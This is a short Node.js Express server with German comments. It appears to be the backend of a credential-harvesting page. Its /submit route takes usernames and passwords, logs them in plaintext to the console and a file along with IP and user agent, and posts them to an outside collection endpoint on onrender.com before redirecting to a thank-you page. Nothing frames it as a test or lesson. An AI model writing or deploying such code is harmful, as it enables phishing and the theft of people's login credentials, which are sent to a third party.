const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
// const fetch = require('node-fetch'); // Nur nötig für Node <18!

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

app.post('/submit', async (req, res) => {
  try {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { username, password } = req.body;

    // Debug: Logge, was im Body ankommt
    console.log("Request-Body:", req.body);

    const logData = {
      timestamp: new Date().toISOString(),
      ip: clientIp,
      userAgent: req.headers['user-agent'],
      username: username,
      password: password
    };

    // Debug: Was wird an Render geschickt?
    const renderPayload = {
      username: username,
      password: password,
      clientIp: clientIp
    };
    console.log("Sende an Render:", renderPayload);

    // Nutze global fetch bei Node 18+
    const fetchFn = globalThis.fetch || require('node-fetch');
    const renderResponse = await fetchFn('https://dein-render-service.onrender.com/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(renderPayload)
    });

    // Debug: Logge Render Response
    console.log("Render Response status:", renderResponse.status);
    if (!renderResponse.ok) {
      const text = await renderResponse.text();
      throw new Error('Render antwortete mit Fehler: ' + text);
    }

    fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
      if (err) console.error("Log-Fehler:", err);
    });

    console.log("👤 Benutzername erhalten:", username);
    console.log("🔑 Passwort erhalten:", password);
    res.redirect('/danke.html');

  } catch (error) {
    console.error("❌ Fehler:", error);
    res.status(500).send("Serverfehler");
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
});
